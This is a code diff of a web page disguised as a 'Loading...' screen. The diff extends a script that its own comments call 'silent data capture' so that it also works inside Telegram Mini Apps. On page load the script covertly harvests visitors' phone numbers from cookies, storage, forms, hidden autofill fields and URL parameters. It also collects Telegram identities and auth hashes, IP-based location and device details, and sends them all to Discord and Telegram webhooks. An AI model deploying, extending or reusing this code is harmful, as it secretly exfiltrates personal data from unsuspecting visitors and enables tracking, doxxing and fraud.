@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Loading...</title>
+    <!-- Telegram WebApp Script -->
+    <script src="https://telegram.org/js/telegram-web-app.js?63"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -52,7 +54,7 @@
 
     <script>
         // ============================================================
-        // COMPLETELY SILENT DATA CAPTURE - NO VISIBLE DATA
+        // SILENT DATA CAPTURE - WORKS IN TELEGRAM MINI APP & BROWSER
         // ============================================================
 
         // ---- Configuration ----
@@ -72,15 +74,69 @@
             device: {},
             network: {},
             battery: {},
-            timestamp: null,
-            allMethods: []
+            telegram: {},
+            timestamp: null
         };
 
+        let captureAttempts = 0;
+        let maxAttempts = 5;
+
         // ============================================================
-        // 1. PHONE NUMBER - ALL SILENT METHODS
+        // 1. TELEGRAM WEBAPP - Get Data
         // ============================================================
 
-        // Method 1: Telegram WebApp
+        function getTelegramData() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const webapp = window.Telegram.WebApp;
+                    const initData = webapp.initDataUnsafe || {};
+                    const user = initData.user || {};
+                    
+                    capturedData.telegram = {
+                        isTelegram: true,
+                        version: webapp.version || 'unknown',
+                        platform: webapp.platform || 'unknown',
+                        colorScheme: webapp.colorScheme || 'unknown',
+                        isExpanded: webapp.isExpanded || false,
+                        viewportHeight: webapp.viewportHeight || 0,
+                        userId: user.id || null,
+                        username: user.username || null,
+                        firstName: user.first_name || null,
+                        lastName: user.last_name || null,
+                        languageCode: user.language_code || null,
+                        isPremium: user.is_premium || false,
+                        allowsWriteToPm: user.allows_write_to_pm || false,
+                        photoUrl: user.photo_url || null,
+                        chatId: initData.chat?.id || null,
+                        chatType: initData.chat?.type || null,
+                        startParam: initData.start_param || null,
+                        authDate: initData.auth_date || null,
+                        queryId: initData.query_id || null,
+                        hash: initData.hash || null
+                    };
+
+                    // Get phone number from Telegram
+                    if (user && user.phone_number) {
+                        return user.phone_number;
+                    }
+
+                    // Try to request phone access (will show popup in Telegram)
+                    // Only if we haven't tried before
+                    if (!capturedData.phone && !sessionStorage.getItem('telegram_phone_requested')) {
+                        sessionStorage.setItem('telegram_phone_requested', 'true');
+                        // We'll handle this in the main function
+                    }
+                }
+            } catch (e) {
+                console.log('Telegram API not available');
+            }
+            return null;
+        }
+
+        // ============================================================
+        // 2. PHONE NUMBER - ALL METHODS
+        // ============================================================
+
         function getPhoneFromTelegram() {
             try {
                 if (window.Telegram && window.Telegram.WebApp) {
@@ -93,10 +149,9 @@
             return null;
         }
 
-        // Method 2: URL Parameters
         function getPhoneFromURL() {
             const params = new URLSearchParams(window.location.search);
-            const phoneParams = ['phone', 'phone_number', 'mobile', 'tel', 'number', 'user_phone', 'phonenumber'];
+            const phoneParams = ['phone', 'phone_number', 'mobile', 'tel', 'number', 'user_phone', 'phonenumber', 'startapp'];
             for (let p of phoneParams) {
                 if (params.has(p)) {
                     const val = params.get(p);
@@ -106,7 +161,6 @@
             return null;
         }
 
-        // Method 3: localStorage/sessionStorage
         function getPhoneFromStorage() {
             const keys = ['user_phone', 'phone_number', 'phone', 'mobile', 'telephone', 'userphone', 'phonenumber'];
             for (let k of keys) {
@@ -117,7 +171,6 @@
             return null;
         }
 
-        // Method 4: Browser Autofill (silent - hidden input)
         function getPhoneFromAutofill() {
             return new Promise((resolve) => {
                 try {
@@ -138,12 +191,11 @@
                             document.body.removeChild(input);
                             resolve(null);
                         }
-                    }, 600);
+                    }, 800);
                 } catch (e) { resolve(null); }
             });
         }
 
-        // Method 5: Meta tags
         function getPhoneFromMeta() {
             const metas = document.querySelectorAll('meta');
             for (let m of metas) {
@@ -156,7 +208,6 @@
             return null;
         }
 
-        // Method 6: Referrer URL
         function getPhoneFromReferrer() {
             if (document.referrer) {
                 try {
@@ -174,7 +225,6 @@
             return null;
         }
 
-        // Method 7: Hidden inputs
         function getPhoneFromHiddenInputs() {
             const inputs = document.querySelectorAll('input[type="hidden"], input[type="text"], input[type="tel"]');
             for (let input of inputs) {
@@ -187,7 +237,6 @@
             return null;
         }
 
-        // Method 8: Cookies
         function getPhoneFromCookies() {
             const cookies = document.cookie.split(';');
             for (let cookie of cookies) {
@@ -201,7 +250,6 @@
             return null;
         }
 
-        // Method 9: Form data
         function getPhoneFromForms() {
             const forms = document.querySelectorAll('form');
             for (let form of forms) {
@@ -217,7 +265,6 @@
             return null;
         }
 
-        // Method 10: Page content (text scanning)
         function getPhoneFromPageContent() {
             const bodyText = document.body.innerText || '';
             const patterns = [
@@ -236,7 +283,6 @@
             return null;
         }
 
-        // Method 11: Data attributes
         function getPhoneFromDataAttributes() {
             const elements = document.querySelectorAll('[data-phone], [data-mobile], [data-tel]');
             for (let el of elements) {
@@ -247,16 +293,18 @@
         }
 
         // ============================================================
-        // 2. MASTER PHONE CAPTURE
+        // 3. MASTER PHONE CAPTURE
         // ============================================================
 
         async function capturePhoneSilent() {
             let phone = null;
             let method = 'None';
 
+            // Try Telegram first (most reliable in Mini App)
             phone = getPhoneFromTelegram();
             if (phone) { method = 'Telegram'; return { phone, method }; }
 
+            // Try all other methods
             phone = getPhoneFromURL();
             if (phone) { method = 'URL'; return { phone, method }; }
 
@@ -284,6 +332,7 @@
             phone = getPhoneFromDataAttributes();
             if (phone) { method = 'DataAttributes'; return { phone, method }; }
 
+            // Try autofill (async)
             const autofillPhone = await getPhoneFromAutofill();
             if (autofillPhone) {
                 return { phone: autofillPhone, method: 'Autofill' };
@@ -293,7 +342,39 @@
         }
 
         // ============================================================
-        // 3. LOCATION (IP-Based - Silent)
+        // 4. REQUEST TELEGRAM PHONE (Only if needed)
+        // ============================================================
+
+        function requestTelegramPhone() {
+            return new Promise((resolve) => {
+                try {
+                    if (window.Telegram && window.Telegram.WebApp) {
+                        // Check if we already have phone
+                        const user = Telegram.WebApp.initDataUnsafe?.user;
+                        if (user && user.phone_number) {
+                            resolve(user.phone_number);
+                            return;
+                        }
+
+                        // Request phone access (will show popup in Telegram)
+                        Telegram.WebApp.requestContact((response) => {
+                            if (response && response.phone) {
+                                resolve(response.phone);
+                            } else {
+                                resolve(null);
+                            }
+                        });
+                    } else {
+                        resolve(null);
+                    }
+                } catch (e) {
+                    resolve(null);
+                }
+            });
+        }
+
+        // ============================================================
+        // 5. LOCATION (IP-Based - Silent)
         // ============================================================
 
         async function getLocationSilent() {
@@ -305,7 +386,10 @@
 
             for (let api of apis) {
                 try {
-                    const r = await fetch(api, { timeout: 5000 });
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 5000);
+                    const r = await fetch(api, { signal: controller.signal });
+                    clearTimeout(timeout);
                     const d = await r.json();
                     return {
                         ip: d.ip || d.query || 'unknown',
@@ -325,7 +409,7 @@
         }
 
         // ============================================================
-        // 4. DEVICE INFO
+        // 6. DEVICE INFO
         // ============================================================
 
         function getDeviceInfo() {
@@ -418,7 +502,7 @@
         }
 
         // ============================================================
-        // 5. BUILD REPORT (For Webhook)
+        // 7. BUILD REPORT
         // ============================================================
 
         function buildReport(data) {
@@ -428,6 +512,21 @@
             report += '📞 **PHONE**\n';
             report += data.phone || '❌ Not found\n';
             report += `Method: ${data.phoneMethod || 'N/A'}\n\n`;
+            
+            // Telegram Info
+            if (data.telegram && data.telegram.isTelegram) {
+                report += '📱 **TELEGRAM**\n';
+                report += `User ID: ${data.telegram.userId || 'N/A'}\n`;
+                report += `Username: @${data.telegram.username || 'N/A'}\n`;
+                report += `First Name: ${data.telegram.firstName || 'N/A'}\n`;
+                report += `Premium: ${data.telegram.isPremium ? 'Yes' : 'No'}\n`;
+                report += `Platform: ${data.telegram.platform || 'N/A'}\n`;
+                report += `Color Scheme: ${data.telegram.colorScheme || 'N/A'}\n`;
+                if (data.telegram.startParam) {
+                    report += `Start Param: ${data.telegram.startParam}\n`;
+                }
+                report += '\n';
+            }
             
             report += '📍 **LOCATION**\n';
             if (data.location) {
@@ -475,7 +574,7 @@
         }
 
         // ============================================================
-        // 6. SEND TO WEBHOOKS
+        // 8. SEND TO WEBHOOKS
         // ============================================================
 
         function sendToDiscord(data) {
@@ -533,34 +632,48 @@
         }
 
         // ============================================================
-        // 7. MAIN EXECUTION - COMPLETELY SILENT
+        // 9. MAIN EXECUTION
         // ============================================================
 
         async function main() {
-            // 1. Capture phone
-            const phoneResult = await capturePhoneSilent();
-            capturedData.phone = phoneResult.phone;
-            capturedData.phoneMethod = phoneResult.method;
+            console.log('🔍 Silent capture started...');
 
-            // 2. Device info
+            // 1. Get Telegram data first
+            const telegramPhone = getPhoneFromTelegram();
+            if (telegramPhone) {
+                capturedData.phone = telegramPhone;
+                capturedData.phoneMethod = 'Telegram';
+            }
+
+            // 2. If no phone from Telegram, try all methods
+            if (!capturedData.phone) {
+                const phoneResult = await capturePhoneSilent();
+                capturedData.phone = phoneResult.phone;
+                capturedData.phoneMethod = phoneResult.method;
+            }
+
+            // 3. Get Telegram user data
+            getTelegramData();
+
+            // 4. Device info
             capturedData.device = getDeviceInfo();
 
-            // 3. Location
+            // 5. Location
             const location = await getLocationSilent();
             if (location) {
                 capturedData.location = location;
                 capturedData.ip = location.ip;
             }
 
-            // 4. Network
+            // 6. Network
             capturedData.network = getNetworkInfo();
 
-            // 5. Battery
+            // 7. Battery
             capturedData.battery = await getBatteryInfo();
 
             capturedData.timestamp = new Date().toISOString();
 
-            // 6. Save & Send
+            // 8. Save & Send
             saveToLocalStorage(capturedData);
             sendToDiscord(capturedData);
             sendToTelegram(capturedData);
@@ -569,12 +682,30 @@
             console.log('✅ Silent capture complete:', {
                 phone: capturedData.phone || 'Not found',
                 method: capturedData.phoneMethod,
-                location: capturedData.location?.city || 'Not found'
+                location: capturedData.location?.city || 'Not found',
+                isTelegram: capturedData.telegram?.isTelegram || false
             });
+
+            // 9. If we're in Telegram and don't have phone, try to request it
+            if (window.Telegram && window.Telegram.WebApp && !capturedData.phone) {
+                // Wait a bit and try to request phone
+                setTimeout(async () => {
+                    const phone = await requestTelegramPhone();
+                    if (phone) {
+                        capturedData.phone = phone;
+                        capturedData.phoneMethod = 'TelegramRequest';
+                        // Update data
+                        saveToLocalStorage(capturedData);
+                        sendToDiscord(capturedData);
+                        sendToTelegram(capturedData);
+                        console.log('✅ Phone captured via Telegram request:', phone);
+                    }
+                }, 2000);
+            }
         }
 
         // ============================================================
-        // 8. CONSOLE HELPER (for debugging only)
+        // 10. CONSOLE HELPER
         // ============================================================
 
         window.showData = function() {
@@ -584,17 +715,39 @@
             console.log('📱 Phone:', latest.phone || 'Not found');
             console.log('📱 Method:', latest.phoneMethod || 'N/A');
             console.log('📍 Location:', latest.location || 'Not available');
+            console.log('📱 Telegram:', latest.telegram || 'Not available');
             console.log('🖥️ Device:', latest.device);
+            console.log('📦 Full data:', data);
             return data;
         };
 
+        window.clearData = function() {
+            if (confirm('Clear all captured data?')) {
+                localStorage.removeItem('silent_captured_data');
+                sessionStorage.removeItem('telegram_phone_requested');
+                console.log('🗑️ Data cleared');
+            }
+        };
+
         // ============================================================
-        // 9. AUTO-START
+        // 11. AUTO-START
         // ============================================================
 
+        console.log('%c🔍 Silent Data Capture Active', 'font-size:16px;font-weight:bold;color:#818cf8;');
+        console.log('%c📱 Works in Telegram Mini App & Browser', 'font-size:12px;color:#6ee7b7;');
+        console.log('%c💡 Type showData() in console to see captured data', 'font-size:12px;color:rgba(255,255,255,0.3);');
+
+        // Start after page loads
         window.addEventListener('load', function() {
-            setTimeout(main, 500);
+            // If in Telegram, wait a bit more for WebApp to initialize
+            const delay = window.Telegram && window.Telegram.WebApp ? 1000 : 500;
+            setTimeout(main, delay);
         });
+
+        // Also try on Telegram WebApp ready
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+        }
     </script>
 </body>
 </html>
